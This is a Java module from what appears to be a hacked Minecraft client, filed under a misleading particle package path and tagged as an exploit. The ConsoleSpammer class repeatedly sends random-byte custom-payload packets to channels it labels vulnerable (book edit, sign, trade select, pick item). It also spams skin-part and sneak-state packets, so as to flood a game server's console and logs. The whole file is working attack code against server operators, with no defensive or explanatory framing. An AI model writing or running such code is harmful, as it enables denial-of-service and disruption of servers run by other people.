package net.minecraft.client.particle.chroma.module.exploit;

import java.util.ArrayList;

import io.netty.buffer.Unpooled;
import io.netty.util.internal.ThreadLocalRandom;
import net.minecraft.client.particle.chroma.event.EventTarget;
import net.minecraft.client.particle.chroma.event.events.EventUpdate;
import net.minecraft.client.particle.chroma.module.Category;
import net.minecraft.client.particle.chroma.module.Module;
import net.minecraft.client.particle.chroma.settings.Setting;
import net.minecraft.client.particle.chroma.utils.Timer;
import net.minecraft.entity.player.EnumPlayerModelParts;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C0BPacketEntityAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class ConsoleSpammer extends Module
{
	private Timer timer;
	private PacketBuffer payload;
	private String[] vulnerableChannels = {"MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem"};
	
	public ConsoleSpammer()
	{
		super("ConsoleSpammer", 132, Category.EXPLOIT);
	}
	
	@Override
	public void setup()
	{
		ArrayList<String> modes = new ArrayList<String>();
		modes.add("Payload");
		modes.add("MineSecure");
		this.getSetManager().rSetting(new Setting(321, "Mode", "", this, "Payload", modes));
		this.getSetManager().rSetting(new Setting(322, "Delay", "", this, 100, 0, 500, true));
		timer = new Timer();
		payload = new PacketBuffer(Unpooled.buffer());
		byte[] rawPayload = new byte[ThreadLocalRandom.current().nextInt(128)];
		ThreadLocalRandom.current().nextBytes(rawPayload);
		payload.writeBytes(rawPayload);
		super.setup();
	}
	
	@Override
	public void onToggle()
	{
		timer.reset();
		super.onToggle();
	}
	
	@EventTarget
	public void onUpdate(EventUpdate event)
	{
		this.setSuffix(" §7" + this.getMode());
		
		if (!timer.hasReach(this.getSetManager().getSettingById(322).getValueD()))
		{
			return;
		}
			
		if (this.getMode().equals("Payload"))
		{
			mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(vulnerableChannels[ThreadLocalRandom.current().nextInt(vulnerableChannels.length)], payload));
		}
		else
		{
			mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.HAT, ThreadLocalRandom.current().nextBoolean());
			mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.JACKET, ThreadLocalRandom.current().nextBoolean());
			mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_PANTS_LEG, ThreadLocalRandom.current().nextBoolean());
			mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_PANTS_LEG, ThreadLocalRandom.current().nextBoolean());
			mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_SLEEVE, ThreadLocalRandom.current().nextBoolean());
			mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_SLEEVE, ThreadLocalRandom.current().nextBoolean());
			
			for (int i = 0; i < 5; i++)
			{
				mc.thePlayer.sendQueue.addToSendQueue(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.STOP_SNEAKING));
				mc.thePlayer.sendQueue.addToSendQueue(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.START_SNEAKING));
			}
		}
		
		timer.reset();
	}
}